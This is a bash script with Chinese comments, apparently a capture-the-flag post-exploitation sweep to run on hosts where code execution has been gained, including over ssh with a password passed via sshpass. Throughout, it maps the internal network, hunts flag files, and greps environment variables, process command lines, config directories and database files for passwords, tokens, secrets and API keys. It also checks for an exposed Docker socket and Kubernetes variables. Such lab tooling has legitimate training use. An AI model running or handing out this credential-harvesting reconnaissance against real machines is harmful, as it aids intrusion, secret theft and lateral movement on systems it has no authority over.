#!/bin/bash
# 通用 flag 清点脚本：在已取得执行权的主机上运行（RCE 回显 / ssh / 上传执行）。
# 只做只读侦察：文件系统、环境变量、常见位置、数据库文件、进程命令行、内网邻居。
# 用法（本地主机）:  bash /opt/tools/flag_sweep.sh
# 用法（经跳板）   :  sshpass -p <pass> ssh user@host 'bash -s' < /opt/tools/flag_sweep.sh
echo "########## flag_sweep @ $(hostname 2>/dev/null) ##########"

echo "===== [0] 网络身份 ====="
hostname 2>/dev/null
ip -o addr 2>/dev/null | grep -v " lo " || ifconfig 2>/dev/null | grep -E "inet |flags"
cat /etc/hosts 2>/dev/null
ip route 2>/dev/null || route -n 2>/dev/null
cat /proc/net/arp 2>/dev/null

echo "===== [1] flag 命名文件（文件系统） ====="
find / -xdev -maxdepth 5 \( -iname "flag*" -o -iname "*.flag" -o -iname "*flag*.txt" \) \
  -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/opt/payloads/*" \
  2>/dev/null | head -50 | while read -r f; do
    echo "--- $f"; head -c 500 "$f" 2>/dev/null; echo
  done

echo "===== [2] 常见固定位置 ====="
for p in /flag /flag.txt /flag* /challenge/flag* /root/flag* /home/*/flag* /tmp/flag* /var/tmp/flag* /srv/flag*; do
  [ -e "$p" ] && { echo "--- $p"; head -c 500 $p 2>/dev/null; echo; }
done

echo "===== [3] 环境变量与配置中的旗标/凭据 ====="
env 2>/dev/null | grep -iE "flag|secret|token|passwd|password|api_?key" | grep -viE "path=|hostname"
grep -riE "flag\{|FLAG\{" /etc /srv /var/www /app /opt 2>/dev/null --include="*" -l 2>/dev/null | head -10

echo "===== [4] 数据库文件 ====="
find / -xdev -maxdepth 5 \( -name "*.db" -o -name "*.sqlite*" \) -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/*" 2>/dev/null | head -10 | while read -r db; do
  echo "--- $db"
  strings "$db" 2>/dev/null | grep -iE "flag\{|flag-|secret" | head -5
done

echo "===== [5] 进程命令行（服务凭据/旗标线索） ====="
ps auxww 2>/dev/null | grep -iE "pass|pwd=|key=|flag|secret" | grep -v grep | head -20

echo "===== [6] 容器/编排面 ====="
ls -la /var/run/docker.sock 2>/dev/null && echo "!! docker.sock 可用"
env 2>/dev/null | grep -iE "kubernetes|kube|_SERVICE" | head -10

echo "########## sweep 完成：以上每一条 flag 形态串都值得提交 ##########"
